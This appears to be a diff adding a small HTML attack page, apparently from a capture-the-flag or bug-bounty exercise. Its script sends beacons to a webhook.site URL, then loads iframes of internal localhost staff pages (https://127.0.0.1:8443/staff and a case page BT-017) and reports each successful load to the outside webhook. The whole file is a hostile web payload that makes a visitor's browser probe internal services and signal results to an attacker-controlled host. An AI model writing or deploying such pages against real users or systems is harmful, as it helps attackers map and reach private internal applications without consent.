@@ -1,0 +1,17 @@
+<!doctype html><html><head><title>tb</title></head><body>tb
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+new Image().src=H+"/r?k=B_loaded&v=1";
+var f=document.createElement("iframe");
+f.width=1200; f.height=900;
+f.src="https://127.0.0.1:8443/staff";
+f.onload=function(){ new Image().src=H+"/r?k=B_frame_loaded&v=1"; };
+document.body.appendChild(f);
+setTimeout(function(){
+  var g=document.createElement("iframe");
+  g.width=1200; g.height=900;
+  g.src="https://127.0.0.1:8443/staff/cases/BT-017";
+  g.onload=function(){ new Image().src=H+"/r?k=B_case_loaded&v=1"; };
+  document.body.appendChild(g);
+}, 4000);
+</script></body></html>
